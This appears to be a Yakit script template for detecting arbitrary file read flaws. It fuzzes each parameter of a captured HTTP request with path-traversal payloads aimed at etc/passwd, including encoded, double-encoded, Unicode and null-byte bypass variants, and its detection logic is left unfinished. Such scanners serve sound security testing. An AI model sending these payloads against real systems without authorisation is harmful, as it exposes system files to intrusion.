__DESC__ = "任意文件读取检测脚本框架 - 包含 CLI 参数定义和参数遍历"
__VERBOSE_NAME__ = "任意文件读取检测框架"
__KEYWORDS__ = "file-read,lfi,framework,arbitrary-file-download,path-traversal"

// 配置项
debug = false
threads = 10

// -------------------------------------------------------------------
// CLI 参数定义
// -------------------------------------------------------------------
flowIDStr = cli.String(
    "httpflow-id",
    cli.setVerboseName("HTTPFlowID"),
    cli.setHelp("History 中的 HTTPFlow ID,用于获取请求/响应包内容"),
    cli.setRequired(true),
)

// 可选参数示例
targetFile = cli.String(
    "target-file",
    cli.setVerboseName("目标文件"),
    cli.setHelp("指定要读取的目标文件路径（可选）"),
    cli.setDefault("etc/passwd"),
)

maxDepth = cli.Int(
    "max-depth",
    cli.setVerboseName("最大遍历深度"),
    cli.setHelp("路径遍历的最大深度（默认: 8）"),
    cli.setDefault(8),
)

cli.check()

// -------------------------------------------------------------------
// 辅助函数
// -------------------------------------------------------------------
aiOut = msg => {
    try {
        yakit.AIOutput(msg)
    } catch {
        println(msg)
    }
}

// -------------------------------------------------------------------
// 核心数据结构
// -------------------------------------------------------------------

// 路径遍历前缀模式
traversals = [
    // 基础遍历
    "../../../../../../../../",  // 8层
    "../../../../",
    "../",
    
    // URL 编码绕过
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/",
    "..%2f..%2f..%2f..%2f",
    
    // 双重编码
    "%252e%252e%252f%252e%252e%252f",
    
    // Unicode 编码
    "%c0%ae%c0%ae/%c0%ae%c0%ae/",
    
    // 双写绕过
    "....//....//....//",
    
    // 混合斜杠
    "..\\/..\\/..\\/",
]

// 后缀绕过模式
suffixes = [
    "",
    "%00",
    "%00.jpg",
]

// -------------------------------------------------------------------
// Payload 生成函数
// -------------------------------------------------------------------
generatePayloads = func(targetFile, maxDepth) {
    payloads = []
    
    // 根据 maxDepth 动态生成遍历路径
    for depth = 1; depth <= maxDepth; depth++ {
        baseTraversal = str.Repeat("../", depth)
        payloads = append(payloads, baseTraversal + targetFile)
    }
    
    // 添加预定义的绕过模式
    for _, traversal = range traversals {
        payloads = append(payloads, traversal + targetFile)
    }
    
    // 添加后缀变体
    finalPayloads = []
    for _, payload = range payloads {
        for _, suffix = range suffixes {
            finalPayloads = append(finalPayloads, payload + suffix)
        }
    }
    
    return finalPayloads
}

// -------------------------------------------------------------------
// 参数遍历核心逻辑
// -------------------------------------------------------------------
fuzzTask = func(threads, url, param, payloads) {
    aiOut(sprintf("正在检测参数: %s", param.Name()))
    
    swg = sync.NewSizedWaitGroup(threads)
    
    for _, payload = range payloads {
        swg.Add()
        go func {
            defer swg.Done()
            
            // 构造 Fuzz 请求
            freq = param.Fuzz(payload)
            res, err = freq.ExecFirst()
            
            if err != nil {
                if debug {
                    aiOut(sprintf("请求失败 [%s]: %v", payload, err))
                }
                return
            }
            
            if res == nil {
                return
            }
            
            // 提取响应体
            body, err = str.ExtractBodyFromHTTPResponseRaw(res.ResponseRaw)
            if err != nil {
                return
            }
            
            // TODO: 在这里添加检测逻辑
            // 例如：检查响应内容是否包含目标文件的特征
            
            if debug {
                aiOut(sprintf("Payload: %s | Status: %d | Length: %d", 
                    payload, res.StatusCode, len(body)))
            }
        }
    }
    swg.Wait()
}

// -------------------------------------------------------------------
// 主程序入口
// -------------------------------------------------------------------

// 1. 获取 HTTPFlow
flowID = parseInt(flowIDStr)
flowsChan := db.QueryHTTPFlowsByID(flowID)
flow = nil
for f := range flowsChan {
    flow = f
    break
}

if flow == nil {
    aiOut(sprintf("HTTPFlow 查询失败: 未找到 ID 为 %v 的请求", flowID))
    return
}

// 2. 解析请求
reqBytes = flow.GetRequest()
if reqBytes == nil { reqBytes = []byte(flow.Request) }
if reqBytes == nil || len(reqBytes) == 0 {
    aiOut("请求包为空,无法检测")
    return
}

isHttps = flow.IsHTTPS
freq, err := fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
if err != nil {
    aiOut(sprintf("解析请求失败: %v", err))
    return
}

aiOut(sprintf("开始任意文件读取漏洞检测 (Target: %s)...", flow.Url))

// 3. 获取所有参数
allParams = freq.GetCommonParams()
validParams = []

// 参数过滤（可选）
ignoredParams = ["PHPSESSID", "JSESSIONID", "_ga", "_gid", "submit", "Submit"]

for param in allParams {
    ignore = false
    for _, i = range ignoredParams {
        if str.MatchAllOfRegexp(param.Name(), sprintf("(?i)%s", i)) {
            ignore = true
            break
        }
    }
    if !ignore {
        validParams = append(validParams, param)
    }
}

if len(validParams) == 0 {
    aiOut("未发现可测试的有效参数")
    return
}

// 4. 生成 Payloads
payloads = generatePayloads(targetFile, maxDepth)
aiOut(sprintf("生成了 %d 个 Payload", len(payloads)))

// 5. 遍历所有参数进行检测
for param in validParams {
    fuzzTask(threads, flow.Url, param, payloads)
}

aiOut("=== 任意文件读取检测完成 ===")
